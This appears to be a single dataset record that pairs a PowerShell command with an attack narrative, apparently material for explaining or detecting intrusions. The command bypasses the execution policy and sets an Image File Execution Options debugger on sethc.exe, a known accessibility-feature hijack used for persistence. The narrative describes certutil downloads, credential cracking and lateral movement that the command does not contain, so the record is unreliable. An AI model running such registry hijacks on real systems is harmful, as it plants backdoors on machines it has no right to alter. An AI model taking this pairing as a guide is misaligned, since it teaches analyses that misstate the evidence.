powershell.exe -ExecutionPolicy Bypass -C "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\" /v Debugger /t REG_SZ /d \\"C:\\windows\\system32\\sethc.exe\\" /f;REG query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\"

output.narrative: The attackers initiate their presence through two instances of using certutil.exe to download executables onto the targeted machine(s). This allows them to establish connectivity between the affected computer and a specified web location, prompting further malicious actions such as executing commands remotely, utilizing PowerShell scripts to gather information, accessing privileged areas within the system, escaping defensive mechanisms put forth by the operating system, carrying out cracking operations on administrative login details, moving laterally throughout the local network, escalating existing privileges, and evading detection mechanisms.
